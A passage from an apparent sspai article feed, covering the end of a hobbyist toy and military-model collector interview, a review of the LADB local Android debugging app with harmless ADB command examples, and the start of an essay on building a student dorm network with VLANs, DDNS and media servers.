<p>A：哈哈哈哈哈哈那个也是，其实一开始买的时候我没想那么多，拍着拍着，就感觉，好像可以整个活哈哈。</p>\n<p>我的内容分两个类型，一个是有稿件的评测向，会有更多观点。另一个就是这种开箱了，比较看我当前的状态。</p>\n<blockquote><p><strong>Q：因为我自己也是个模玩爱好者，但是在购买、收藏模玩的过程中，难免会听到身边人有「幼稚」「浪费钱」的质疑声。作为多年的老玩家，不知道您有没有遇到过身边人的不理解呢？您又是如何看待这种现象的？</strong></p></blockquote>\n<p>A：这个肯定是有的，<strong>一定会有</strong>（笑）。而且比较多的是长辈这边吧，因为可能我接触的行业是互联网这块，所以身边的人倒是比较不会说这个。</p>\n<p>长辈这边的话，就像说我父亲，其实他并不知道我到底是做什么的现在，只是感觉说，我买了好多玩具放在家里，也会问我说这些东西是能不能卖掉换钱的，我说当然可以，但是没到必要的时候我不会这么做。就会跟他解释说这些东西，其实现在算是我工作的一部分吧，他本身也比较信任我所以也比较好沟通。但是这种现象是没办法避免的。</p>\n<p>因为至少我感觉我们的父辈或者再往上一辈，他们当时的环境下并不是这样的。现在还有很多很多他们不理解的新东西，当然对我们来说，每天也都有很多很多我们暂时无法理解的新东西出现，面对这种情况的时候，我感觉就是只要自己是不违法乱纪的，那是可以去做。</p>\n<blockquote><p><strong>Q：这种心态的确挺好的，对于自己不了解的领域，保持尊重其实就是一种很不错的态度了。</strong></p></blockquote>\n<p>A：对啊，因为工作习惯上，也是需要我去学习很多我不了解的东西。</p>\n<blockquote><p><strong>Q：既然前面也提到了「卖掉换钱」这个点，我就想到近几年的模玩市场也开始出现了一些恶意炒价、预订跑路的现象，想问问您是怎么看待的呢？</strong></p></blockquote>\n<p>A：这个拆分两点来说吧，先是<strong>恶意炒价</strong>这个。</p>\n<p>其实这个就是单纯的一个供需问题了，有市场需求，就会有价格上涨，这块我觉得不只是发生在模玩市场这块，往好的想是表明了这个圈子在不断变大，用户数量增多，消费力也在变强。往坏了想就是，你想买一些热门的东西，可能会买不到了。这个我一直是觉得存在即合理，但是我不参与，也想尽量让这个圈子，至少在我能力下的去变好吧。我也经常会跟群友聊这块的事情，我是觉得在你消费能力内的，去消费是合适的，但是如果价格超过了你的接受范围，那就不要去管了。玩玩具还是开心最重要。</p>\n<p>然后<strong>预订跑路</strong>这个，其实我想说的很多，因为这个涉及到太多方面的内容了。</p>\n<p>货源的供给其实是个大店名额通常会更多，小店往往只能分个零头的。在这个几乎人人都能开淘宝店的情况下，会发现这些年新增了特别特别多的店铺。店家跟上级拿货，越下家的订单量通常就更少，但是有时候你如果只拿一点点，人家又会给你当散客来看待。一款模型，利润点在销售这边，一层抽一层的，其实真的不怎么高，特别是做预订的话，资金压力是特别大的。可能你一年投入个百来万，忙活一年，就赚个几万块钱，但是你还得继续投入。</p>\n<p>从预订到出货是有段时间的，这段时间你想盈利，要么你就是扫现货来左手进右手出，要么你就是坚持着。每个月每一批一直弄，直到开始补款到货了才开始龟速回点血。</p>\n<p>上百万的货款，你是没办法直接拿出来的，就跟被套在里头一样，那如果期间经济出现问题了，有的人他真的可能扛不下来了，就选择跑了。真的，淘宝很难做。特别是做模玩这块。</p>\n<p>我一个朋友今年开始做的，几个月时间砸了 100 多万进去，回钱这块，也是零零散散的，一个赚个几块钱，十几块钱的。￼但是你又停不下来，你继续做，那就是继续投钱先。</p>\n<blockquote><p><strong>Q：是啊，虽然很多玩家在吐槽模玩店，但其实大家也过得不太轻松。</strong></p></blockquote>\n<p>A：对于玩家来说，肯定是这样的，因为这些年跑路的那些店啊什么的，我也是受害者之一哈哈哈。就这种时候我也很无奈啊，我也会吐槽，因为我也是玩家（笑）。</p>\n<blockquote><p><strong>Q：刚才聊了那么多，感觉您也通过模玩认识了很多朋友、更加深入地了解了模玩这个市场，那么除了这些之外，您觉得模玩、做 UP 主还给您带来了什么吗？</strong></p></blockquote>\n<p>A：兴趣相投的朋友。这里我其实想提一下我的另一个爱好了，就是花式切牌，我大概是在 08 年左右玩的魔术，然后 10 年左右开始玩的花式切牌，算是国内比较早的一批玩家了吧。</p>\n<p>因为这个领域非常非常小众，所以会一块玩的当时基本上全都是一些兴趣相投的朋友，参加过一些比赛，拿过全国冠军，认识了不少好友，我当时跟我父亲说，你儿子现在在全国各地都能有朋友，我去哪都会有人关照一下。</p>\n<p>这一点在玩具上其实也是比较类似的。在我工作之后，我就喜欢给玩具拍照，然后会发到微博或者是一些玩具的 App 上面，当时就会收获到一些好友了，特别是做视频以后。</p>\n<p>起初像是说在玩玩具的过程，会结交到一些线下的好友，或者会因此跟一些原本的朋友走得更近一些。然后在发布视频以后，会认识到全国各地甚至是海外的朋友，我的内容我自己感觉是比较有我个人想法的，也相信关注我的是有那种，因为某一个观点说到他们心里了，所以留下来了。在之前WF上海的时候，有几个我们在逛展见面的朋友， 我们就聊的有来有回的，明明是第一天见面的，却像是认识了很久一样。</p>\n<h2>第四章：征战沙场的幻想</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/dd2945514e8c604f30dc86608b8e6fa0.png\"></figure><blockquote><p><strong>Q：先跟大家介绍一下你自己吧</strong></p></blockquote>\n<p>A：大家好，我是 MichaleWey，来自山城重庆。平时工作比较忙，闲暇时间的话喜欢看看历史类的书、刷刷 B 站，喜欢做军事模型、研究咖啡，算是理工男里面稍微文艺一点的人。这些爱好也几乎构成我全部的个人生活时间</p>\n<blockquote><p><strong>Q：可以分享一下你是什么时候开始玩模型的吗？</strong></p></blockquote>\n<p>A：其实我玩模型的起点，并不是军事模型，而是刚上小学时买的四驱车，陆陆续续也做了不少，冲锋战神、野狼这些比较出名的当然一个都不能缺了；后来在一些小商品批发市场发现了不需要胶水的木质拼装模型。在这些经历中我逐渐体会到了看着一件作品从乱糟糟的零件组合成一个栩栩如生的模型成就感，最重要的是这些模型将我脑海里的幻想具象化了，模型所微缩的现实对象往往是一个小学生无法触及的东西，这种栩栩如生的感觉令人上瘾。</p>\n<blockquote><p><strong>Q：那么你入坑军模的契机是什么呢？</strong></p></blockquote>\n<p>A：要说我对军事模型的热情从何而来，应该是小学二年级参加学校航模比赛的时候，我在学校购买了一盒军舰模型的组装零件，在父亲的帮助下制作完成，没有上色更没有旧化，仅仅是照着说明书拼起来，也就是素组，就拿去参加比赛了，比较有趣的是由于我父亲也是理工科出身，为了我的船能跑的更快，他更换了船体内部的电机和线路，结果就是我的船比起他所有船都快。那只军舰在水池中劈荆斩浪的身影以及甲板上舰桥、导弹的满满细节，让我对军事类的模型有了极佳的好感，它们能满足我对模型的一切美好期待，这便是契机了。</p>\n<p>后来小学末期也组装过小鹰号、大黄封号、林肯号航母，大一制作过全内构T34-85，下一次再做就是工作后了。</p>\n<p>男人嘛，总是憧憬热血的军旅生涯，而且对军事装备有天生的兴趣，由此，我喜欢制作模型的方向转变为了军事模型，毕竟谁不喜欢饱经战火洗礼的坚甲利炮栩栩如生展现在眼前呢，现实生活无缘军营不妨碍当一名军迷。</p>\n<blockquote><p><strong>Q：为什么喜欢拼装、收藏军模？</strong></p></blockquote>\n<p>A：我喜欢玩军事类模型是因为我喜欢现实主义的东西，这可能和我的理工科背景有关。从小我就对奇幻的文学作品或影视作品兴趣不大，包括现在我玩的游戏也大多是写实画风，或基于现实的题材，比如《战争雷霆》《帝国时代》《极品飞车》《欧洲卡车模拟2》等等，当现实中存在的工业品在游戏中逼真的被还原出来时，就有很强烈的满足感和兴趣；上大学时大家都在玩《英雄联盟》这类 MOBA 游戏，或者很多魔法奇幻的剧情游戏，基于上面说的我的喜好，我对这类游戏根本喜欢不起来。</p>\n<p>在多年的现实主义心态加持下，我愈发喜欢通过自己的双手重现现实中存在事物的感觉，并且越逼真越能得到满足，既满足自己的成就感，也能满足按比例缩小后它在我脑中的建模快感，越接近真实比例越满足，在此基础上就能脑补出很多场景和故事情节；在肉眼可见的物件上脑补一些场景显然比纯空想要具象的多，我把这种幻想称作理工男的中二病。我想，<strong>看着自己的作品一点点变成自己想要的样子，不论是谁都会满足的</strong>。</p>\n<p>我自认为我有一定的收藏癖，不仅仅是限于模型，日常生活我还喜欢收藏正版游戏光盘、喜欢乐队的专辑、电子产品的包装盒等等，当然最喜欢的还是模型，毕竟是自己亲手做出来的东西。我还专门为我的这些明星买了一个宜家的玻璃展示柜。我认为喜欢收藏是一个人对于自己爱好的肯定，对自己坚持的肯定，同时也能满足自己的成就感，当一定时间后回头来看看自己曾经制作的作品，是一段回忆，是动手能力的成长，是审美的提高，也是历史人文知识的充实。</p>\n<blockquote><p><strong>Q：你觉得玩军模给你带来了什么？</strong></p></blockquote>\n<p>A：玩模型不管是军模也好高达也好，带给玩家最直接的就是成就感，制作模型与其说是照着说明书拼起来这个机械的工作不如说是一场创作，将一件模型做成我们想象中的样子，按照我们自己对战场、历史的理解去旧化、改装。再来就是之前提到的，看着作品朝着自己想要的样子在变化，就是一种满足感，要知道现实中不是每件事情都是照着自己的意愿发展的。</p>\n<p>除了感性上的成就感、满足感、耐心的磨练以外，最为直接的就是这些模型所对应的现实对象在脑海中有了完整而真实的轮廓。</p>\n<p>拿坦克模型来举例，我们平时了解一款坦克的故事只能通过视频、图片。这些东西都是平面的，它的三维比例、细节，给人的印象并不是那么的具象，只有一个大致轮廓。但模型不同，模型是三维的、细节丰富，我们可以 360 度无死角观察，去满足我们的好奇心。再有，全内构的模型甚至还能让我们真实的了解到一辆坦克内部长啥样，它钢铁外壳里面都装了些什么东西，它为什么能战胜敌人的坦克……；机械的东西令人着迷。</p>\n<p>这些就是模型能带给我的另一面的收获：<strong>具象化的观感</strong>和<strong>一些冷知识</strong>。</p>\n<p>最重要的一点就是动手能力的提升。这一点源自很多细小零件的组装、死角部位的安装，这些很锻炼一个人的手臂稳定力量，也能提升对各种工具的使用熟练度，有时候我们生活中用到的一些工具和问题解决方法不外乎也都是类似的。动手能力的提升既能提升下一个作品的质量也能对我们的实际工作生活产生好处。</p>\n<blockquote><p><strong>Q：在玩军模的过程中，你是否遇到过他人的不理解，你又是怎么想的呢？</strong></p></blockquote>\n<p>A：这个<strong>当然遇到过了</strong>，毕竟这项爱好不是特别的大众而且还有那么一丢丢费钱。我之前做虎式全内构坦克模型的时候发了一条朋友圈，大致就是展示一下坦克的内构制作成果。后来上班的时候一个同事问我是不是又单身了，日子太无聊。当然是一个没有恶意的寒暄了，但是也能看出来玩模型不是一个所有人都理解的事情，尤其是现在二十四五岁年龄段很多同龄人都是高达玩家的氛围下，玩军模的更少了。</p>\n<p>我认为<strong>自己的爱好不用在意别人怎么看</strong>，自己喜欢就行，谁还没个爱好呢。</p>\n<blockquote><p><strong>Q：你有哪些值得分享的收藏？</strong></p></blockquote>\n<p>A：我的收藏并不多，毕竟也才26岁，不过我觉的我工作后开始制作的模型可以分享一下，大佬勿喷就是，因为工作后才有属于自己的钱嘛，所以就买了全套的制作工具，终于可以不只做素组了。</p>\n<p>以下是我近几年做的一些作品，包括四号坦克（Panzerkampfwagen IV Ausf D）、三号坦克（Panzerkampfwagen III Ausf L）、SDK251装甲车、虎式坦克（Panzerkapfwagen VI Tiger）等，这些作品有肉眼可见的制作水准差距，还请多多包涵。做了一堆德国车，后续会考虑做军舰和我国自己的坦克。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/15/1d683cf99db2e6b3e075e11d5a908dab.png\"></figure><h2>小结</h2>\n<p>这篇文章并不只是在谈玩具本身，抛开玩具这一载体，文中所展示「亚文化」也是值得关注的一点。这些相对小众的爱好，也许不被他人所理解、尊重，甚至会遭到质疑和批评。只有身处其中的人，才能感受到自己与同好的热爱。</p>\n<p>希望看到这篇文章的你，也能一如既往地坚守自己的热爱。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71458"},{"title":"App+1 | 无需数据线和电脑，它让 Android 玩机更轻松：LADB","date":"2022-02-18 06:28:47","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>ADB（<a href=\"https://developer.android.com/studio/command-line/adb\">Android Debug Bridge</a>）是用于调试 Android 设备的命令行工具，对开发者来说，ADB 自然是日常工作的得力助手，而对我们业余玩家来说，它也可以用来调校一些默认情况下接触不到的功能和设置。</p>\n<p>在早期的 Android 平台上，我们只能通过 USB 数据线连接电脑和手机，然后再在电脑上使用 ADB 工具（前提是已经在开发者选项中开启了 USB 调试开关）；从 Android 10 开始，Google 眼看大家那可怜的 USB 接口数量和满桌的数据线，无奈之下推出了一个无线调试功能，只需要电脑和手机连接到同一个 Wi-Fi（即在同一局域网下）就可以进行调试。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/3c0eb93be7d8cb46ec37d8183e627c59.png\"></figure><p>虽然简化如此，但用户还是需要一台电脑才可以执行 ADB 的相关命令。比如说我想随时随地「冻结」某个应用<sup class=\"ss-footnote\" href=\"\" title=\"adb shell pm disable-user com.tencent.mm\" footnote-id=\"1\">1</sup>，或是通过 Shizuku 使用 App Ops 进行更全面的权限管理，用小黑屋、黑阈、绿色守护等工具优化后台和续航；再比如此前少数派推荐过的 Wavelet 来个「一耳朵」音质提升。身边似乎总得准备一台配置了 Android 开发工具或 ADB 环境的电脑，挺麻烦的。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/54850\" target=\"_blank\">不用 root 也能优化好手机？为此我试了一下这十款应用</a></li>\n<li><a href=\"https://sspai.com/post/61348\" target=\"_blank\">在权限管理上跑过 iOS 14 和 Android 11：App Ops 4.0 上手指南</a></li>\n<li><a href=\"https://sspai.com/post/65456\" target=\"_blank\">App+1 | 不懂均衡器调校也能量身定制，无需折腾的 Android 音效提升工具</a></li>\n</ul>\n<p>既然现在新设备已经支持 <a href=\"https://sspai.com/post/57427\" target=\"_blank\">无线调试</a>，我们是不是可以把手机本身当作电脑，让它自己连接自己呢？换句话说，手机本身既是 ADB Server 也是 Client，自然也满足在同一局域网的条件。</p>\n<p>是的，已经有大神想到这个点子并开发了一个工具应用：<a href=\"https://github.com/tytydraco/LADB\" target=\"_blank\">LADB</a>，顾名思义即 Local ADB，运行在本地的 ADB，基于 GPL 协议开源。</p>\n<p>我们安装后试一试效果，目前看起来功能还是挺简单的，就一个 Shell 窗口。简单说一下使用步骤：</p>\n<ul>\n<li>先连接任意一个 Wi-Fi，就算没有接入互联网都可以；</li>\n<li>然后打开 LADB，将它调整为小窗模式（或分屏模式）——因为无线调试的配对码等信息每次点击都会动态生成，所以才需要小窗模式同时打开本应用和开发者选项；</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/292a7074ba96639f56576a638305e64e.png\"></figure><ul><li>进入开发者选项，开启无线调试，首次使用需要配对设备，将配对码和端口填入本应用即可；</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/9cbbe843f032e7c021067f3bb94f1ffd.png\"></figure><p>成功以后，下次再使用就会自动连接了。</p>\n<p>我们不仅可以使用 adb shell 相关的命令，还可以使用 Linux 系统中一些常用的命令。这样即便没有电脑，也可以做部分调试了，而且访问权限会比其他类似的模拟终端应用（诸如 Termux）高一些。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/15/28cfa3661f1fdba794e76abbf12a5bd7.png\"></figure><p>最后，我们仍然不能使用 LADB 这个应用来执行类似这样的命令：</p>\n<pre class=\"language-shell\"><code>adb root\nadb reboot\nadb install\n...</code></pre>\n<p>因为 LADB 只是向用户开放了 adb shell 输入，所以在没有 root 的前提下也只能执行 <code>adb shell xxx</code> 这样的命令（比如上文提到的停用应用）。从源码来看它是将整个 ADB 工具编译到移动平台的，我猜也是考虑到安全原因没有暴露除 shell 以外的其他命令输入。不过对于一些常见的 ADB 使用需求，比如 Shizuku、黑阈、绿色守护等，使用 LADB 来完成配置已经足够了。</p>\n<p>另外，我也基于原作者的开源代码做了一些 Shell 使用上的优化，其他功能基本不变，感兴趣的同学可以 <a href=\"https://github.com/ysy950803/LADBS/raw/ladbs/app/release/app-release.apk\">下载</a> 体验。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71355"},{"title":"年度征文｜不要对生活妥协，用极客精神在 4 平米的空间中活出精彩","date":"2022-02-18 03:30:39","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<h2>前言</h2>\n<h3>环境介绍</h3>\n<p>我的寝室是一个大约 15 平的双人间，由于不是上床下桌，两个人的床和衣柜占据了寝室中绝大多数空间，剩下留给我的私人空间，仅是一张 120cm 长，带有书架的学习桌，加上周围零零碎碎的空间，总共约 4 平米大小。在这个不大的空间内，仅仅放下两台显示器都稍显局促，可能学校在设计之初就并不希望我们花费大把的时间浪费在寝室的书桌上（笑）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/article/61b531d89a44f6509ba7766d1befeb3a\"><figcaption>图源自网络</figcaption></figure><p>在这个不大的空间内，原本我并没有什么期待，能够打个游戏/吃个外卖，就已经不错了。我是一个爱折腾的人，在远在 1300KM 的家中，我早就部署好了全屋 HomeKit，无死角的 Wi-Fi 网络，NAS 等等极客爱玩的东西。但是对着寝室这巴掌大的地方，对于狭小空间无数次的失望和抱怨充斥这我学习之外的时间。“为什么不让他变得更舒适”，自从疫情返校之后，这个想法就一直萦绕在我的脑中。</p>\n<h2>舒适的网络，是一切的开始</h2>\n<p>网络是现代人生活的基础，也是我们与世界连接的桥梁。好的网络环境是我们这些科技爱好者舒适生活的大前提，然而我们宿舍的网络环境并算不上优秀。</p>\n<h3>宿舍的基础网络，问题很多</h3>\n<p>现在的校园，基本上都是以教育网为主，我们学校也是如此。校园网有其独特的优势比如：</p>\n<ul>\n<li>每一个分配的 IP 都是独立的教育网公网 IP</li>\n<li>上行带宽大</li>\n<li>访问学术网站可以有文献库授权</li>\n<li>在校内即使网段不一样也可以通过三层交换机互相访问<sup class=\"ss-footnote\" href=\"https://sspai.com/post/64142\" title=\"可以参考少数派的入网指南系列\" footnote-id=\"1\">1</sup>\n</li>\n</ul>\n<p>但是纵使有这些优点校园网对我来说也有一些不可忽视的问题：</p>\n<ul>\n<li>校园网需要繁琐的认证过程</li>\n<li>受限于公网IP的数量，每个学生只能有 <strong>5</strong> 个设备同时在线。</li>\n<li>由于宿舍建造时间比较久远，宿舍内的网口最高只支持 100Mbps</li>\n<li>按流量计费</li>\n</ul>\n<p>繁琐的认证对于桌面设备而言还有简洁的办法，但是对于移动设备而言可以说是灾难级的体验，特别是学校封锁了 HTTP 认证方式而全部转为 HTTPS 认证之后。不过好在学校也开放了 802.1x 的认证方式，使得移动端的体验稍微好了一些。而同时在线设备数量限制对于我来说则是一个巨大的痛点，这意味着设备数量繁多的我必须要套一层 NAT 并且设置端口转发或者 DMZ 才能获得较为不错的远程和局域网体验。</p>\n<p>而流量计费则是彻底扼杀了我对于校园网的幻想，如果按照我的网络消耗量来看，将会是一笔不可忽视的支出，相比起来 100 Mbps 的带宽反而并不那么不可接受。</p>\n<p>不过好在我生活的宿舍楼还算比较新，近几年移动宽带也把光纤拉进了每个寝室内。这对于有极大流量需求的我来说算是一根救命稻草，不过移动宽带也有一些致命的缺点：</p>\n<ul>\n<li>没有公网 IP</li>\n<li>天生 NAT 3，并且由于移动宽带的特性，联网游戏的丢包率极高体验非常糟糕</li>\n</ul>\n<h3>我改了一点点，就差一点接近完美</h3>\n<p>两种网络都有他们独自的优势和劣势，那对于一个成年人来说，当然是「我全都要」，取其所长，弃其所短。那么接下来我就来和各位盘盘我的宿舍网络结构。</p>\n<p>首先先上一个网络拓扑图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/376c349af7739050aa16186d54392e8f.png\"><figcaption>宿舍网络拓扑图</figcaption></figure><h4><strong>入网</strong></h4>\n<p>首先，移动的光纤接入房间之后，连到光猫上，为了获得最好的上网体验，肯定需要使用桥接模式进行 PPPoE 的上网设定，好在移动校园宽带本身为了多播（让同寝室多个同学用不同的宽带账号），本身就是带有 VLAN 的桥接模式，这省去了我很多时间。光猫 LAN 口直连我的路由器—— Unifi Dream Machine Pro （以下简称 UDM Pro）的 WAN 口进行播号上网。给宿舍局域网，我设定了 192.168.31.0/24 的网段，这也是我宿舍的主要局域网络，各个设备都在同一个网段下进行通信。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/a6011644bca9cfb5de48043cbb6490a0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/7da1a5d1a585ddfc77198193d96c510a.jpeg\" alt=\"\"></figure><p> </p>\n<p>而校园网，则需要专门照顾一下，原本校园网的设计是从宿舍墙面上的 86 面板上连接路由器或者交换机，学生通过进行自建局域网或者用自己的 IP 分配名额给不同的设备分别获取 IP，而由于我平时只有两台主力桌面端设备—— PC 与 Mac mini 需要连接校园网，所以我使用 VLAN 技术对其进行划分：</p>\n<blockquote><p>VLAN：Virtual LAN，又称虚拟局域,是一种建构于局域网交换技术（LAN Switch）的网络管理的技术，可以借此技术透过控制交换机有效分派出入局域网的分组到正确的出入端口，达到对不同实体局域网中的设备进行逻辑分群（Grouping）管理，并降低局域网内大量资料流通时，因无用分组过多导致壅塞的问题，以及提升局域网的信息安全保障。</p></blockquote>\n<p>而划分 VLAN 再加以适当的防火墙规则就可以隔离校园网和局域网中的广播，让我的各个设备不至于串台，也能我的两个主力设备获得独立的校园网 IP。</p>\n<p>宽带网线从光猫接出之后，连接到 UDM Pro 的 WAN 口上，通过 PPPoE 进行播号。校园网端口则直接连接到 UDM Pro 的 LAN 口上，在配置中为其专门划分一条 Campus LAN 的 VLAN 网络，设定为 VLAN-only 网络，而局域网则设置为 LAN 打开 DHCP 服务器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/116e1727fd8fb4133eec1ab527284da7.png\"></figure><p>如此设置，两个网络环境就已经接入我的路由器了。</p>\n<h4><strong>网络划分</strong></h4>\n<p>UDM Pro 的下级，连接着我需要有线上网的设备，比如：PC，Mac mini，Apple TV 4K，PS5，树莓派，以及无线接入点 （Access Point）。不过下级网络就稍显复杂，为了让 PC 和 Mac 都可以同时连接宽带，首先要在 UDM Pro 连接两台桌面设备的端口上设定为 Untagged口（由于 UnifiOS 中的 VLAN 设定与其他厂商逻辑不一样，这里用更大众化的表述方法）。在 macOS 的网络设定中可以很轻松的划分一条或者多条 VLAN，而 PC 由于主板就带有双网卡，我就毫不客气的接上了两条网线，每个端口对应一个局域网/校园网。</p>\n<p>光是接上网线并不能让设备在宽带和校园网中无缝穿梭，于是我针对我需要访问的特定网络，在设备的路由表中指定了学校的网关，和更小的「跃点数」<sup class=\"ss-footnote\" href=\"\" title=\" 为路由指定所需跃点数的整数值（范围是 1 ~ 9999），用来在路由表里的多个路由中选择与转发包中的目标地址最为匹配的路由。当规则匹配时，设备会优先选择跃点数小的路由地址。\" footnote-id=\"2\">2</sup>，来让需要用学校路由访问的 IP 段，在设备中获得更高的优先级。同时，也指定了 0.0.0.0 以及更大的「跃点数」来让非校园网内容统一走宽带的路由地址。至此，我的两台主力设备才算完美的接入到「双网络」环境中。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/3b5e3cf4e035ffc149998ef0de5982c9.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/e3f4147df1a635fc7d4733d5d32b9bc7.png\" alt=\"\"></figure><p> </p>\n<p>不过稍显可惜的是 UDM Pro 并不支持双 WAN 接入，如果是支持的设备（比如 OpenWRT/RouterOS 等系统的设备），仅需要在路由器上配置规则就可以做到局域网内的所有设备均可以访问两个广域网而非对于特定设备设定路由表制作双局域网了。</p>\n<p>而对于局域网内的其他一些设备比如 Apple TV 4K，我则直接使用 Mac mini 上的 Surge 进行接管，以获得更良好的冲浪体验。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/83fd7bd8320f5f913f5ba72f2a866306.png\"><figcaption>这是我的寝室网络树状图</figcaption></figure><h3>还有一些不足，但是我克服了一些</h3>\n<p>经过我的改造，寝室的网络确实已经接近完美的状态，但是还有一个暂时没有找到方法克服的痛点，那就是校园网的 IP 问题，由于学校并不可能给我们分发固定 IP，而自己设定固定 IP 的时候很有可能会和其他同学的设备冲突导致无法上网。因此在两台在双局域网的环境下的设备，我依然选择了 DHCP 上网的方式。</p>\n<p>平时我在实验室工作的时候，偶尔需要使用 Microsoft Remote Desktop （以下简称 RDP） 远程访问我寝室中的 PC 来处理一些 macOS 无法处理的数据。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/article/7eed9a7294386ee57de53dd0f7e773f7\" alt=\"Microsoft Remote Desktop」をApp Storeで\"><figcaption>Microsoft Remote Desktop</figcaption></figure><p>不过由于寝室网络和实验室的网络并不在同一个二层网络中，所以按照主机名进行远程登录的方法就被堵死了，但是通过 IP 还是可以借由学校的三层交换机互相访问。而因为 IP 地址是由学校的 DHCP 服务器分发的，会随着时间变化的 IP 就成了令我头疼的问题，因此我在我的 PC 上设置了一个 DDNS 服务：</p>\n<blockquote><p>DDNS：Dynamic DNS又称动态DNS 是域名系统（DNS）中的一种自动更新名称服务器（Name server）内容的技术。根据互联网的域名订立规则，域名必须跟从固定的IP地址。但动态DNS系统为动态网域提供一个固定的名称服务器（Name server），透过即时更新，使外界用户能够连上动态用户的网址。</p></blockquote>\n<p>简单的来说，当你需要访问一个网址的时候，你的电脑会先向 DNS 服务器请求这个网址对应的 IP 地址。通过 IP 地址，设备之间才可以建立起连接。而 DDNS 则是把我动态的 IP 地址映射到 DNS 服务器上的一种服务，每当我的 IP 变化，DDNS 服务就会把变更后的 IP 地址反映给 DNS 服务器。这样当我输入域名网址时，DNS 服务器就能正确的返回我 PC 目前的 IP 地址。</p>\n<p>通过我自己一直在用的 CloudFlare 托管我的 IP 地址，这样在使用 RDP 进行访问的时候只需要通过我的域名进行 DNS 解析，就可以指向正确的远程地址了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/09/806bd2298814a49571185e065b9e87ea.png\"><figcaption>通过域名远程访问寝室的 PC</figcaption></figure><p>而当校园网 IP 变更时，我也设置了一个基于 Python 的邮件提醒服务。这样不管我寝室的 IP 如何变更，我都可以最快的知道，以防部署的 DDNS 服务失效，无法访问寝室设备的窘境出现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/09/87f803a7bfcbe19674b82a54bc5a25fc.png\"><figcaption>IP 变更邮件提醒服务</figcaption></figure><p>至此，我寝室的网络结构搭建，到这里结束了，虽然不排除未来会有升级的可能性，但是目前的结果对于我来说已经非常满意了。</p>\n<h2>自动化的娱乐系统，是幸福感提升的根源</h2>\n<p>搞定了网络，接下来的着眼点就应该在从实验室回归的短暂的空闲时光了，但是空闲的时间有限，经常有时候会因为媒体搜刮的烦恼不愿意去占用宝贵的休息时间，最后放弃一个影片或者剧集。为此我改造了我的媒体流程。</p>\n<h3>如何管理我的媒体，才能缓解一天的疲劳</h3>\n<p>我的影音管理主要分为两个部分，在线流媒体和本地媒体。在线流媒体主要用来看一些及时更新的剧集电影：比如 Disney+，Netflix，YouTube 等等，这些流媒体我都在我的 Apple TV 4K 上进行观看，配合 tvOS 仪式感满满。而从流媒体直接观看内容，也省去最麻烦的资源搜刮过程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/06/4c8cae7a582e8e0fcf7ea3ea73acb4e0.png\"><figcaption>我的 Apple TV 主页</figcaption></figure><p>但是对于一些不在这些主流流媒体的内容，比如日本动漫新番，以及日剧。我则采用了本地媒体进行观看的方式，通过 Plex Server 管理本地剧集，搜刮元数据，再通过 infuse 客户端（iPhone/iPad/Mac/Apple TV）进行观看。</p>\n<figure class=\"ss-imgRows\" figcaption=\"使用 Plex 和 Infuse 管理番剧\"><img src=\"https://cdn.sspai.com/2022/01/23/fe3e86ea49bd2fadaccb8d55512718cb.png\" 